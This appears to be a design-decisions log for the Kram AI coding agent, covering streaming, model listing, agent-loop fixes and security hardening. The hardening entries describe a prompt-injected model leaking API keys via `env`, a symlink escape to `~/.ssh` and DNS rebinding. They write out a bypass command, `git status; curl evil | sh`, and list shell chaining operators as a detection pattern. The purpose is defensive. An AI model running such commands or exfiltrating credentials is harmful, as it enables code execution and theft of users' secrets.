across repeated `refreshLiveIndicator` calls, only `refreshTranscript`
is allowed to touch it.

**Root cause #2, the second missed width bug**: `renderPromptBlock`
(`promptblock.go`) still wrapped user prompt content against `m.width`
— the full terminal width — rather than `m.viewport.Width`, the actual
(narrower, once Ctrl+B tiles the screen) chat column. The exact same
bug class the previous DECISIONS entry fixed for streaming content and
tool activity, just missed in this one file, since promptblock.go wasn't
touched by that pass. One-line fix: `width := m.viewport.Width` instead
of `m.width`. `promptblock_test.go`'s existing width-based tests all
constructed a bare `Model{width: N}` without ever syncing
`m.viewport.Width` to match (an invariant real usage always maintains
via `syncViewportSize`, but a raw struct literal in a test doesn't) —
updated each one to set both, matching the real invariant rather than
loosening the fix to satisfy an unrealistic test setup.

---

## Exposing PreferStreaming: the default-on choice broke a real deployment

The streaming-by-default change (a few entries up) traded some
resilience for the live indicator's reasoning excerpt actually working —
documented as a deliberate, accepted tradeoff at the time. A user hit
the failure mode in practice within the same session: every turn failed
outright with `"no meaningful content within the peek window"` against a
single locally-hosted reasoning model (LM Studio, 27B).

Traced to `router.BoundedPeek`'s `streamPeekIdleTimeout` (5s, unchanged —
see below for why): reasoning fragments reset that idle timer just like
real content does, so a model that's *slowly streaming* reasoning is
fine no matter how long it takes in total (that's the whole reason the
5-second window is an *idle* timeout, not an overall ceiling — see its
own doc comment, which already names a similar incident with a 120B
OpenRouter reasoning model). What actually happened here is different in
kind: the model's inference server sends **nothing at all** — not
content, not a reasoning fragment, not even a keepalive — during prompt
*prefill*, before generation of any kind has started. Kram's system
prompt (nine base sections, the generated tools overview, etc.) is
large; prefilling it on a local/LAN GPU for a 27B model routinely takes
longer than 5 seconds of complete silence, and with only one provider
configured (no fallback candidate), that one rejection fails the whole
turn.

**Deliberately did not touch `streamPeekIdleTimeout`** to fix this.
Loosening a carefully-tuned, already-incident-informed failover timer
globally, based on one local-model deployment's prefill characteristics,
would trade away *every* deployment's fast dead-provider detection to
fix a problem that's actually specific to this one setup. The right fix
is scoped to where the actual variance lives — does streaming work well
for *this* deployment — not a global timer retune.

`daemon.Config` gains `PreferStreaming bool` (this struct's own zero
value: false/buffered, matching `agent.Config`'s own field) — `Run`'s
`agent.Config{...}` construction now reads `cfg.PreferStreaming` instead
of the hardcoded `true` from before. Both entrypoints gain a `-stream`
flag (`cmd/kram`, `cmd/daemon`), defaulting `true` so the improvement
still applies out of the box everywhere it already worked — `-stream=false`
is the real, durable escape hatch this exact failure mode needed, not a
one-off local patch. This is precisely the deferred scope item the
original PreferStreaming DECISIONS entry already named: "exposing
PreferStreaming as an actual CLI/config toggle — a real, separate piece
of work this issue's plumbing now sits ready for" — now genuinely
motivated by a real deployment hitting the gap, not speculative.

`TestRunThreadsPreferStreamingToGateway` (`internal/daemon/daemon_test.go`,
replacing the old streaming-defaults-true-only test now that the choice
is caller-controlled) is table-driven over both directions, asserting
the real gateway request's `Stream` field matches `Config.PreferStreaming`
exactly. `TestRunMainStreamFlagDisablesPreferStreaming`
(`cmd/daemon/main_test.go`) and `TestRunThreadsStreamOptionIntoDaemonConfig`
(`cmd/kram/main_test.go`) pin the same contract one layer up, at each
binary's own flag-parsing boundary — the regression tests for the
concrete failure mode itself: `-stream=false` must actually reach
`daemon.Config.PreferStreaming`, not just parse without error.

---

## Auto-detecting a custom provider's real models instead of typing one blind

Finding `custom-lab-bonsai`'s exact model ID for the config work above
required a manual `curl .../v1/models` outside Kram entirely — the
"modelo" field of the custom-provider form (`renderCustomProviderForm`,
`internal/cli/app/accounts.go`) only ever accepted free-typed text, no
visibility into what a server actually serves. A typo or stale name
would only surface later as an upstream 400/404 the first time a real
turn ran, not at the point the mistake was actually made.

`internal/providerping` — already the sanctioned "CLI talks directly to
the third-party server for a quick check, no daemon round-trip" carve-out
(see its own package doc: a `Ping` against the same `/models` endpoint
nearly every OpenAI-compatible server exposes, used today purely as a
connectivity/auth probe with the response body discarded) — gains
`ListModels(ctx, baseURL, apiKey) ([]string, error)`: identical request
shape to `Ping`'s `"openai-compat"` branch, but actually parses
`data[].id` out of the body instead of throwing it away. Verified live
against the real LM Studio server this session's earlier config work
already found (`http://192.168.0.4:1234/v1`, `CUSTOM_LMSTUDIO_API_KEY`):
returned `[google/gemma-4-e4b openai/gpt-oss-20b prism-ml/bonsai-27b
qwen3-coder-30b-a3b-instruct qwen3.5-9b text-embedding-nomic-embed-
text-v1.5]`, sorted, matching what a direct `curl` against the same
endpoint returns.

CLI side follows `pingAccountsCmd`'s own established async pattern
exactly: `fetchCustomModelsCmd` (`commands.go`) returns a `tea.Cmd`
producing `customModelListMsg`. Triggered by `ctrl+l` while focused on
the "modelo" field specifically (`handleCustomProviderFormKey`,
`accounts.go`) — not automatically on every tab-into, since an automatic
fetch on focus would surprise someone who already knows the exact model
name and just wants to type it, and would fire a real network request
before the URL field is even necessarily finished being edited. Requires
a non-empty URL first; a clear status message otherwise rather than a
silent no-op.

A successful fetch enters `customFormPickingModel` — the field-list
render is replaced entirely (not overlaid) by a windowed, scrollable
list (`visibleModelIndices`, mirroring `processpanel.go`'s
`visibleProcessIndices` exactly — a real self-hosted router seen this
session advertised 200+ models, so windowing around the cursor isn't
optional polish). `enter` fills the "modelo" field with the selected ID
and returns to normal form editing; `esc` cancels back to whatever was
already typed there, untouched — manual entry was never actually removed
as a path, just given a faster alternative. A failed or empty fetch
(`customModelListMsg.err` set, or zero models) shows a status message
and leaves the form in its normal typing state — the fallback path stays
real, not just a comment claiming one exists.

---

## Per-provider temperature override

Asked to make a specific local model ("afiado" — sharp/precise, the
opposite of creative/random output) as deterministic as possible for
coding work. Checked the actual code path before adding anything:
`openai.ChatCompletionRequest.Temperature` exists on the wire type, but
nothing anywhere in Kram ever populates it — every request already goes
out with it unset, deferring entirely to whatever default the upstream
server happens to apply. There was no way to pin it from Kram's own
config at all, for any provider.

`config.ProviderConfig` gains `Temperature *float64` — a pointer, so
"never configured" (the overwhelming common case, and the only state
every existing config file is in) is distinguishable from "explicitly
pinned to `0.0`", a real, valid, maximally-deterministic value someone
might genuinely want, not the same as leaving the field alone.
`provider.OpenAICompatible` gains a `temperature *float64` field threaded
through `NewOpenAICompatible`'s constructor, mirroring the exact shape
its own `model string // optional: overrides req.Model when set` field
already established — same override mechanics, same nil-means-
passthrough contract, in `ChatCompletion` right next to where `Model` is
already overridden a few lines up. `internal/provider/factory.go`'s
`Build` (the one real construction site every adapter goes through)
threads `cfg.Temperature` into the openai-compat case.

**Deliberately scoped to `openai-compat` only**, not all four adapter
kinds (anthropic, gemini, openai-responses, openai-compat) — the
concrete need driving this is one local LM Studio server; extending the
same pattern to the other three kinds is genuinely straightforward
follow-up work (same `model`-override shape already exists on all four
constructors) whenever a real need for it shows up on one of them, not
something worth guessing at speculatively now.

`TestOpenAICompatOverridesTemperatureWhenPinned`/
`TestOpenAICompatLeavesTemperatureUnsetByDefault`
(`internal/provider/openai_compat_test.go`) cover both directions at the
adapter level; `TestBuildThreadsTemperatureForOpenAICompat`
(`internal/provider/factory_test.go`) is the end-to-end proof through
`Build` itself — the config field reaching a real outgoing request, not
just parsing without error.

---

## Three targeted agent-loop robustness fixes (post-audit)

A full codebase audit surfaced three small, independent correctness bugs
in the agent loop, each degrading behavior silently in exactly the hard
cases (weak model, subagents, long session) that are the product's stated
target. All three were verified against the real code before fixing; each
got a mechanism-level regression test.

**1. `emptyRetryUsed` latched on forever.** `agent.go` set `emptyRetryUsed
= true` on the first empty model response (to trigger the "your previous
response was empty, answer in plain text now" nudge on the retry) but
never cleared it. Since it feeds `compileTurnPostscript`, a single empty
response anywhere in a run meant *every subsequent turn* — including ones
mid-productive-tool-loop — kept getting that nudge, the exact opposite of
what a model working through a chain of tool calls needs. Fixed by
resetting `emptyRetryUsed = false` once a turn produces tool calls (a
productive turn) — the nudge is meant only for the one retry immediately
after an empty response. `TestRunLoopEmptyRetryNudgeClearsAfterProductive
Turn` scripts empty → tool-call → answer and asserts the final request no
longer carries the stale nudge.

**2. Subagent `ask_question`/approval stalled 10 minutes in silence.**
`RunTask` runs a subagent with `onEvent: nil`, but `runLoop` installs
`sessionAsker`/`sessionApprover` with that same nil callback. If a
subagent called `ask_question`, or a tool hit an `Ask` policy, the event
was emitted to nobody (`emit` drops a nil callback) and the goroutine
blocked on a channel no one could feed — for the full 10-minute
`askQuestionTimeout`/`approvalTimeout`, and with `delegate_task` running
up to 3 subagents concurrently, several such stalls at once. Both methods
now short-circuit when `onEvent == nil`: `Approve` denies immediately (a
subagent must never auto-approve what a human operator would have been
asked to sign off on), `Ask` returns a clear error fast. `TestSession
AskerApproverNilOnEventShortCircuits` uses a plain non-cancelled context
so a missing short-circuit would hang the test for the full timeout
rather than fail — the exact stall the fix prevents. The pre-existing
cancellation test relied on nil `onEvent` to reach the `ctx.Done()` path;
it was updated to pass a non-nil no-op callback, since that path is now
only reachable with a real event sink.

**3. Chained compaction discarded the previous summary.** `Compact` built
the summarization transcript by skipping every `system` message — which
includes the prior compaction marker (a system message that
`EffectiveHistory` prepends as the lead message). So a *second* compaction
threw away the first summary, permanently losing the session's earliest
arc. Fixed by folding the prior compaction marker's content into the new
summary's input (tagged "earlier session summary — fold this forward"),
while still skipping every other system message — the ephemeral
project-context/memory re-injection markers (see the change-detection
entry above), which are rebuilt fresh each turn and correctly ignored.
The pre-existing `TestCompactExcludesExistingSystemMessagesFromTranscript`
encoded the *old* (buggy) behavior verbatim — it asserted the prior
marker was excluded — so it was rewritten as `TestCompactFoldsPriorSummary
ForwardButSkipsOtherSystemMessages`, pinning both halves of the corrected
contract: the compaction marker is carried forward, a project-context
marker is not.

---

## Streaming events use the cheap tail-render path (post-audit #69)

The transcript-perf split (the `transcriptBody` cache + `refreshLiveIndicator`,
from the earlier "camera lenta" fix) moved `animTickMsg` off the full
`refreshTranscript` rebuild — but the audit found the *streaming event
handlers* were never switched over. `handleStreamEvent`'s four hot-path
cases — `delta`, `tool_start`, `tool_result`, `notice` — each mutate only
the streaming tail message, yet all called `refreshTranscript()` (the full
rebuild: glamour re-rendering every prior message, ~16ms on a long
session) on *every* event. With streaming the shipped default and a long
answer producing many deltas, that reintroduced the exact O(full-history)-
per-event cost the split existed to kill, through a path the split's
original PR hadn't covered.

Fixed by switching those four cases to `refreshLiveIndicator()`. The
safety condition they rely on holds by construction: `submit()` appends
the streaming assistant placeholder and calls `refreshTranscript()` once,
which primes `transcriptBody` (the static prefix = everything except the
live tail) and sets `transcriptLiveIndicatorActive = true`, before any
event arrives. From there each event re-renders only the tail. The
terminal `done`/`error` cases deliberately keep the full
`refreshTranscript()` — `done` finalizes the tail to a full markdown
render and must fold it back into the static body; that's correct, not an
oversight.

`TestStreamingEventsUseCheapTailPathNotFullRebuild` primes the body, sets
it to a sentinel, fires all four event types through the real
`handleStreamEvent`, and asserts none overwrote the sentinel (a full
rebuild would) while the delta content still reached the rendered
viewport (the cheap path must actually render, not silently no-op).

---

## Daemon HTTP perimeter: bearer token + Host guard (post-audit #63)

The daemon's HTTP surface drives real code execution — `bash`, `edit_file`,
and (worst) `POST /sessions/{id}/approve`, which answers the very
permission prompts the agent loop raises. The audit found it ran behind
only panic-recovery and logging middleware: no auth, no Content-Type
check, no Host/Origin check. So any local process, or a browser tab via
DNS rebinding, could create a session, send a message, and approve its
own tool calls — code execution as the user. The bitter irony the audit
underlined: the *gateway* already loopback-guards its far less dangerous
`handleSetStrategy`, while the dangerous daemon was wide open.

`server.guardMiddleware` (new, wrapping the mux inside recover→log) closes
it with two layers:

- **Bearer token** — a per-process 128-bit random token required on every
  route except `/health`, compared in constant time (`crypto/subtle`) so a
  timing side channel can't recover it. This is the core defense, and it
  transitively kills the Content-Type/simple-request CORS vector the audit
  also flagged: a cross-origin "simple" request from a browser *cannot*
  set an `Authorization` header without triggering a CORS preflight the
  daemon never answers.
- **Host guard** — rejects any request whose `Host` isn't loopback, the
  cheap defense against DNS rebinding (a rebinding attack arrives with the
  attacker's hostname in `Host`, not localhost). `/health` is exempt: it
  exposes nothing and is the readiness probe a client hits before it knows
  the token.

**Token flow, two paths:**

- *Single binary (`cmd/kram`, the real product):* `cmd/kram` generates one
  token and hands the *same* value to both `daemon.Config.AuthToken` and
  its in-process `daemonclient.New(url, token)` — so the CLI is authorized
  without any file round-trip, and every other local process is not. Fully
  closed, no config surface.
- *Standalone (`cmd/daemon` + `cmd/cli`):* both gain an `-auth-token` flag.
  `daemon.Run` generates one if unset and writes it (0600) to a
  `daemon.token` file next to the DB; a standalone CLI passes that value.

`daemon.Run` writes the resolved token to the `daemon.token` file
regardless (best-effort, logged-not-fatal), so external attach/debugging
works even for the single-binary case. `server.New` gained the token
parameter and logs a loud warning when it's empty (only tests / an
explicitly-insecure run).

`daemonclient` routes both its request-building sites (`doJSON` and
`SendMessageStream`) through one `authorize` helper, so neither can forget
the header. The eval harness (`evals/`), being a hermetic in-process pair
like `cmd/kram`, uses a fixed shared token.

Five `guardMiddleware` tests pin the contract directly (missing token →
401, wrong token → 401, correct token → 200, non-local Host → 403 even
*with* a valid token, `/health` exempt from both). `daemon_test.go`'s
real-`Run` integration test now sends the token as a real client would;
two pre-existing handler tests used `httptest.NewRequest` (whose default
`Host` is `example.com`, which the Host guard correctly rejects) and were
updated to set a loopback `Host`.

---

## Hardening the execution guardrails: symlink escape, env leak, prefix-glob bypass (post-audit #64)

Three correlated findings from the security audit of the tool-execution
path — each verified against the real code, all closing the gap between
"the confinement the comments promise" and "the confinement the code
delivered".

**1. resolvePath followed symlinks out of the workspace.** The path guard
(`internal/daemon/tools/tools.go`) did a `filepath.Clean` + `strings.HasPrefix`
containment check — purely lexical, so a symlink *inside* the workspace
pointing out (a cloned repo carrying `link -> ~/.ssh`) passed it yet
resolved outside. Now, after the lexical check, containment is re-verified
against the real symlink-resolved path: `filepath.EvalSymlinks` on the
target, or — for a not-yet-existing path (a `write_file` creating a new
file, whose *parent* is where a malicious symlink would sit) —
`resolveExistingAncestor` resolves the deepest existing prefix and
re-appends the tail, so the symlinked parent is caught even when the leaf
doesn't exist yet. Both the resolved target and the resolved root go
through `EvalSymlinks`, so a workspace that itself lives under a symlink
(macOS `/var` → `/private/var`) compares consistently. Tests cover reading
an existing file through an escaping symlink, creating a new file through
one, and an in-workspace symlink still being allowed.

**2. bash inherited the daemon's environment, API keys and all.** The
shell command built by `internal/shell` never set `cmd.Env`, so it
inherited `os.Environ()` — including the provider credentials `cmd/kram`
`os.Setenv`s at startup. A prompt-injected model could exfiltrate keys
with a plain `env` / `echo $OPENROUTER_API_KEY`. New `env.go` builds
`redactedEnviron()` — `os.Environ()` minus exactly the credential var
names Kram itself injected (`providercatalog.EnvVars()` plus each custom
provider's synthesized env var, so the list stays in sync automatically).
It's a **denylist of Kram's own secrets, not an allowlist**: the user's
own environment (PATH, HOME, their own GITHUB_TOKEN) survives, so
legitimate commands keep working — the point is to strip what Kram added,
not to sandbox the shell. Applied at all three model-driven shell call
sites (bash, custom manifest tools, run_background).

**3. bash permission patterns were bypassable via shell operators.**
`matchesSubject` does `strings.HasPrefix` on the raw command, so the
StrictPolicy's own `git status*` Allow matched `git status; curl evil | sh`
and ran it *without a prompt*. The evaluator now downgrades a bash `Allow`
to `Ask` whenever the command carries a chaining operator (`;`, `|`, `&`,
backtick, `$(`, newline) — a prefix rule only vetted the leading text, so
a command that can smuggle a second command past it must surface to a
human. Deliberately coarse, **not a shell parser** (per the audit's own
"don't chase a perfect parser" guidance and DECISIONS' existing stance):
it can't reason about what the chained command does, only refuse to
silently auto-approve one that exists. Scoped tight — only `Allow`, only
`bash`; `Deny`/`Ask` and every other tool are untouched, pinned by
`TestChainingDowngradeOnlyAffectsBashAllow`.

Deliberately still deferred (per the roadmap's "don't over-engineer"
note): a full coarse-grained bash mode (allow/ask/deny the whole tool,
no per-command patterns) and an OS sandbox (Landlock/Seatbelt). The three
fixes here close the concrete, demonstrated escapes; those are larger
design decisions for later.

---

## Session repair: orphaned tool_calls no longer permanently brick a session (post-audit #65)

The audit found a durability bug that fully contradicts the product's
"durable sessions" pitch: `agent.runLoop` persists the assistant message
*with* its `tool_calls` before any tool runs (so the record exists even
if a tool blocks), and `Registry.Execute` had no `recover`. A crash or a
tool panic between that append and the results being persisted left the
session with a `tool_call` that has no matching `tool` message. On the
next load, `sanitizeToolHistory` only dropped *malformed* calls — a valid
orphan stayed, and every OpenAI-compatible API rejects that with a 400
(`ClassInvalidRequest`, non-retryable) on *every* subsequent turn. No
product escape hatch existed; the session was dead.

Two fixes:

- **Repair at the wire boundary.** `sanitizeToolHistory` (the one place
  history is made API-valid before sending) now pre-scans for which
  tool_call IDs actually have a `tool` response, and for any valid call
  left unanswered synthesizes a placeholder `tool` message — `[interrupted:
  this tool result was not recorded — the session was resumed after an
  interruption]` — inserted immediately after the assistant message so
  ordering stays valid. An `answered` set guards against double-inserting
  when a real response does exist (which would itself be a 400). Fixing it
  here means every adapter benefits, and it also retroactively repairs any
  session already corrupted by an earlier crash.
- **`recover` in `Registry.Execute`.** A panic inside a tool (a malformed
  MCP response, a nil-deref in a custom tool) is now converted to a normal
  tool-error string rather than unwinding past the agent loop — so the
  loop records *a* result for the call and carries on, never creating a
  fresh orphan.

`TestSanitizeToolHistoryRepairsOrphanedToolCall` and
`TestSanitizeToolHistoryNoDoubleRepairWhenAnswered` pin both halves of the
repair; `TestExecuteRecoversFromToolPanic` (a fake tool that panics) pins
the recover. The pre-existing sanitize test is unaffected — its one
tool_call was already answered.

Coordinates with #73's planned single-transaction `AppendMessage` (which
would shrink the crash window), but the load-time repair is still needed
for sessions corrupted before that lands, so it's the load-bearing fix.

---

## Esc interrupts an in-flight turn (post-audit #68)

The audit noted a table-stakes gap: a running turn couldn't be
interrupted — Esc only closed panels; the only escape was ctrl+c, which
kills the whole program. The wiring to fix it already existed end to end:
`daemonclient.MessageStream.Close()` tears down the SSE connection, the
daemon runs each turn on `r.Context()`, and closing the client connection
cancels that context, which `runLoop` honors. What was missing was a
reference to the stream and a key binding.

The CLI now holds the in-flight `activeStream` (set on `streamStartMsg`,
cleared on `done`/`error`/`submit`). Esc, when no panel is open and a turn
is in flight, closes it: that cancels the daemon turn server-side, marks
the tail message not-streaming with an "interrompido pelo usuário" notice,
and stops waiting. The closed stream produces one final error/EOF on its
reader goroutine — an `interrupting` flag makes `handleStreamEvent`
swallow exactly that one event, so a user-initiated cancel never surfaces
as a scary connection error. The thinking-line meta now shows
"esc interrompe" while a turn runs (and no panel is open), so the
affordance is discoverable exactly when it applies.

`MessageStream.Close()` was made nil-safe as part of this — the interrupt
path closes whatever stream it holds without first proving one was ever
opened, and a zero-value stream must not panic. Three tests pin the
behavior: Esc interrupts (stops waiting, sets the guard, clears the
stream, notices the message); the guard swallows the trailing stream
error; Esc with no in-flight turn is a harmless no-op.

Deliberately kept the connection-close cancel rather than adding a
dedicated `POST /cancel` endpoint: the close already cancels the daemon's
context cleanly, and a separate endpoint is only worth it once headless
mode (#66) needs SIGINT→cancel without a live SSE connection to close.

---

## Headless mode: `kram -p "prompt"` (post-audit #66)

The audit called this the highest product leverage per unit of effort:
every `cmd/kram` entrypoint terminated in the TUI, so there was no way to
run an agent turn in CI, a script, an editor integration, or a cheap
hermetic eval — and the daemon's SSE API already did all the work; only a
non-TUI consumer of it was missing.

`-p "prompt"` runs one turn to completion and prints to stdout, no TUI.
`--json` switches the output from plain text to one JSON event object per
line (the machine-readable shape a harness consumes). `run()` branches to
`runHeadless` right after the in-process daemon/gateway come up — the same
gateway/daemon orchestration the TUI path uses, just a different consumer
of the stream. Verified live against the real LM Studio provider in both
modes (text printed "OK"; JSON emitted the full
`segment→route_start→reasoning*→delta→route_done→done` sequence).

Output shape decisions:
- **Text mode**: assistant deltas go to stdout; tool activity and notices
  go to stderr, so stdout is *only* the answer (pipe-friendly). A trailing
  newline is added. If the buffered gateway path produced no deltas, the
  final message content is printed at `done` so stdout still carries the
  answer.
- **JSON mode**: every stream event is marshaled as a line on stdout.
- Either way, an `error` event returns a non-nil error → non-zero exit,
  so a CI job fails correctly.

Two non-interactive concerns handled explicitly:
- **No human to answer prompts.** A mid-turn `ask_question` or approval
  would otherwise block forever waiting for input that never comes.
  Headless auto-resolves: an **approval is denied** (a script must never be
  able to auto-approve a policy-gated action the operator never saw), a
  **question is answered with a sentinel** telling the model no interactive
  input is available. Both let the turn finish deterministically.
- **No wizard.** The interactive setup wizard can't run without a TUI, so
  headless skips it; if no provider ends up configured the gateway fails
  to start with a clear error — the right non-interactive behavior.

`runHeadless` is fully unit-tested against a fake daemon (text final
answer, JSON event lines, error→non-zero, approval auto-denied); the live
runs covered the real end-to-end path. Deliberately deferred: `SIGINT`→
graceful-cancel in headless (the connection close on process exit already
tears the turn down; a `POST /cancel` endpoint pairs naturally with this
later, as the interrupt entry noted).

---

## Local-store durability: one atomic writer + SQLite WAL (post-audit #73)

The audit found Kram's six on-disk stores under `kramhome` split across
**two durability strategies**, with the split falling exactly the wrong
way. `config` and `permission` wrote atomically (temp file + rename);
`credentials`, `toolsettings`, `onboarding` and `customprovider` used a
raw `os.WriteFile` that truncates the target in place. So the file whose
corruption hurts most — `credentials.json`, holding API keys and OAuth
tokens — was among the *least* protected: a crash mid-`Set`/`SetOAuth`
could leave it truncated and unparseable, i.e. credentials lost. This was
durability held "by convention", and the convention had already diverged.

**`internal/localstore.AtomicWrite`** makes the safe path the only path by
construction rather than by each store remembering to reimplement it: it
writes a sibling `.tmp`, **fsyncs it**, then renames it into place. The
fsync is the part a plain write-then-rename misses — without it the rename
can become visible before the data blocks reach disk, so a power cut (not
just a process crash) can leave a file that exists but is empty/truncated;
fsync forces the bytes down first. The Windows pre-rename `os.Remove` and
its "brief window where neither file exists" reasoning moved here verbatim
from the old `config.Save` — a missing file is the normal first-run state
every store already handles, whereas a truncated one bricks the store. All
six stores now call it: `config.Save` and `permission.SavePolicy` lost
their duplicated inline temp-file dance, and the four raw-write stores
switched over (keeping their `MkdirAll(0o700)` so the secret dir's
tighter perms are preserved — `AtomicWrite` only guarantees the file, not
that its parent is private).

**SQLite (`internal/daemon/store`)** now enables `journal_mode=WAL` and
`busy_timeout=5000` at `Open`, before the schema runs, so every write is
under WAL from the first statement. WAL lets a reader and the single
writer proceed without blocking each other and recovers cleanly from a
crash mid-transaction; `busy_timeout` makes a second kram instance in the
same workspace (two terminals in one project — easy to hit) wait briefly
for the lock instead of failing outright with `SQLITE_BUSY`. These PRAGMAs
fail loudly rather than best-effort: if the durability guarantees the
store is built on aren't actually in effect, that's a startup error worth
seeing, not something to run degraded past.

`AppendMessage` wrapped its two writes — INSERT into `messages`, then the
`sessions.updated_at` touch — in a **single transaction** (`Begin` /
`Commit`, `defer tx.Rollback()` as the belt-and-suspenders cleanup that
no-ops after a successful commit). Two separate autocommits could leave a
session whose timestamp disagrees with its latest message, and widened the
inconsistency window that the orphaned-tool_call repair (#65) also guards.

Deliberately **not** enabling `PRAGMA foreign_keys=ON` here: the schema
declares an FK from `messages.session_id` to `sessions(id)`, but Kram has
never enforced it, and turning it on could reject writes against older
databases with pre-existing rows that don't satisfy it — a behavior change
well outside a durability fix. Left for a dedicated migration if it's ever
wanted. Also still deferred (unchanged from the audit's own scoping):
persisting breaker/telemetry state — re-learning a few failures after a
restart stays acceptable.

Tests pin the observable guarantees, not the mechanism: `AtomicWrite`
creates parents, applies perms, overwrites cleanly, and leaves no `.tmp`
behind on success; `Open` really lands the DB in `wal` mode with a
5000ms busy_timeout (queried back via PRAGMA, not just issued); and a
successful `AppendMessage` leaves the session's `updated_at` equal to the
new message's `created_at`, the visible signature of the two writes
committing as one unit.

---

## Configurable timeouts and breaker tunables (post-audit #76)

Kram targets local models, where a healthy request's latency ranges from
seconds to minutes with the model and its cold-load state. The audit found
the timeouts governing that were all compiled-in constants calibrated for
fast hosted APIs — so a slow-but-healthy local model gets cut mid-response
and forced to fall back to a worse candidate — and one of them was
internally incoherent with the fallback chain.

**The incoherence, concretely.** Each provider had a 120s whole-request
`http.Client` timeout; the daemon's gateway client had a fixed 180s
whole-call timeout. But one gateway call can walk a fallback chain of
several providers back to back, so the client must allow at least
`maxComboLen × providerTimeout`. With two providers that's 240s > 180s: a
perfectly legitimate two-candidate fallback round could be killed
client-side before the chain was even exhausted. A fixed client timeout
can't be right — it has to be *derived* from the chain it fronts.

**`config.Tunables`** (new `tunables:` block, every field optional; an
absent block reproduces the old constants exactly) exposes: `provider_timeout`,
`gateway_client_timeout`, `breaker_failure_threshold`, `breaker_cooldown`.
Durations use a new `config.Duration` type that marshals to/from Go
duration strings ("120s", "2m") — yaml.v3 would otherwise read a bare
number as *nanoseconds*, a footgun in a human-edited file. The zero value
marshals to nothing, so a Save round-trip never litters the file with
"0s" lines for tunables nobody set. Negative values are rejected in
`validate()` (a negative timeout, once resolved, compares as "already
elapsed" — it would silently disable the guard it configures).

**`ResolvedGatewayClientTimeout(maxComboLen)`** encodes the coherence rule:
a user-pinned value is honored verbatim (their call), but left unset it's
derived as `max(180s floor, maxComboLen × providerTimeout + 30s margin)`.
The 180s floor keeps today's generous ceiling for single-provider setups;
the margin is headroom so the last candidate isn't racing the client clock.
`cmd/kram` computes it from the gateway config (`gwCfg.MaxComboLength()`)
and threads it into `daemon.Config.GatewayClientTimeout` — the daemon can't
compute it itself because it talks to the gateway over HTTP and never sees
the provider config, but `cmd/kram` holds both.

**Plumbing kept low-churn deliberately.** The four provider constructors
(~40 test call sites) and `gatewayclient.New`/`breaker.NewRegistry` (~36
more) were left signature-compatible: a `timeoutSetter` interface lets
`provider.Build` apply the timeout after construction via a tiny per-adapter
method instead of a new constructor arg; `NewRegistryWithConfig` and
`NewWithTimeout` are additive, with the old constructors now defaulting
wrappers. So the whole change touched production wiring, not a wall of
test call sites.

Scope held tight per the issue: timeouts are made *coherent and
configurable*, not removed — a genuinely dead provider must still be cut.
Deliberately **not** added: a CLI flag per tunable (config.yaml is the
coherent home, alongside the providers and combos these values govern; a
flag each would bloat the CLI for a rarely-touched knob). Also unchanged:
the idle-vs-total-timeout distinction the issue floats as an ideal — the
`http.Client` ceiling is still whole-request, and `router.BoundedPeek`
still owns idle-timeout during the peek phase; splitting the streaming read
into its own idle timeout is a larger change left for when it's shown to be
needed. Tests pin the resolver defaults/overrides, the coherence arithmetic
(a 3-provider combo derives 390s, provably > 3×120s), the breaker honoring
a tuned threshold/cooldown by actually tripping differently, `Build`
applying the timeout to the real client, and a full config Save→Load
round-trip of the `tunables:` block.

---

## Structural boundary enforcement + gateway-config extract (post-audit #75)

The audit's verdict was that Kram's single most valuable, hardest-to-retrofit
property — the clean layering where the CLI never imports daemon/gateway/
router internals and the daemon reaches the gateway only over HTTP — had
**zero automatic enforcement**. A stray `import "…/internal/router"` in
`internal/cli/app` would compile and pass every test, silently breaching the
layer. This change turns that convention into a gate, and moves the most
subtle config code out of the least-testable place.

**`internal/archcheck`** locks the boundaries. The rule-evaluation logic
(`Analyze`) is a pure function — synthetic import graph in, violations out —
unit-tested including the trap a naive `strings.Contains("internal/gateway")`
check falls into: `internal/gatewayclient` and the newly-added
`internal/gatewayconfig` share a string prefix with `internal/gateway` but
are different packages that must NOT be flagged. Matching is therefore on
whole path segments (`p == prefix || strings.HasPrefix(p, prefix+"/")`).
`Load` feeds `Analyze` the real graph via `go list`, and
`TestKramLayeringHolds` asserts the real module has zero violations — the
literal "a layer can't be breached again" contract, proven against the real
registry, with a `len(pkgs)==0` guard so it can't pass vacuously. The four
`DefaultRules` (cli↛daemon, cli↛gateway, cli↛router, daemon↛gateway) were
each verified to hold today before being encoded. `scripts/verify.sh` gained
an explicit fail-fast `architecture boundary check` step; the same test also
runs in the ordinary `go test ./...` sweep.

The single most important subtlety came out of an adversarial review of this
very change: `go list` on one platform only sees the files selected for that
platform, so a cross-layer import hidden behind a build tag (a `*_windows.go`
file, `//go:build windows`) would slip past a check run on the Linux CI
runner — and Kram genuinely uses OS-split files (`internal/shell/runner_{unix,
windows}.go`) and ships for Windows and Android. So `Load` **sweeps every
platform Kram ships** (`linux`, `darwin`, `windows`, `android`, all
`CGO_ENABLED=0` to match the cgo-free cross-builds) and unions the import
sets. Verified by injecting a `//go:build windows` breach and watching the
gate catch it while running on Linux — the exact hole the review predicted,
now closed rather than merely documented.

**Extract: `cmd/kram/autodetect.go` → `internal/gatewayconfig`.** The
provider-reconciliation logic — the most subtle config code in the project,
with a documented split-brain bug (an account added via the Accounts UI
after `config.yaml` existed used to stay invisible until the file was
hand-edited) — lived in `package main`, the least-testable place. It moved
verbatim (three entry points exported: `LoadStoredCredentials`, `Detect`,
`Reconcile`; helpers kept unexported), so a second entrypoint like
`cmd/gateway` could reuse it and, more importantly, the existing regression
tests now exercise it as a normal package. A small `isolateReconcileTest`
helper copy stays in `cmd/kram`'s tests because `main_test.go` still drives
`loadOrDetectGatewayConfig` (which delegates here) and the two packages
can't share an unexported test helper.

**Deliberately deferred: removing the `os.Setenv` credential passing.** The
issue floats decoupling credentials from the global environment. But the
gateway resolves each provider's key via `config.ProviderConfig.APIKey()` →
`os.Getenv(APIKeyEnv)` at `provider.Build` time — so the env is load-bearing
end to end, and decoupling only the *detection* side would just move the
global coupling, not remove it. Removing it entirely means rethreading
resolved credentials through config→Build→adapter: a broad refactor the
issue's own scope guard forbids ("não reorganizar os pacotes além do
necessário … não uma refatoração ampla"). Left for a dedicated change. The
extract's value — testability — is fully realized without it.

---

## TUI language: English, with centralized per-area string tables (post-audit #74)

The TUI mixed Brazilian Portuguese and English hardcoded strings, sometimes
in the same widget — the approval prompt (where clarity matters most) being
half-Portuguese read as unfinished for a global public beta. The decision:
the whole TUI is **English**. This is a UI-language choice only — the system
prompt (`internal/daemon/agent/systemprompt.go`) still answers in the user's
language by design and was deliberately not touched.

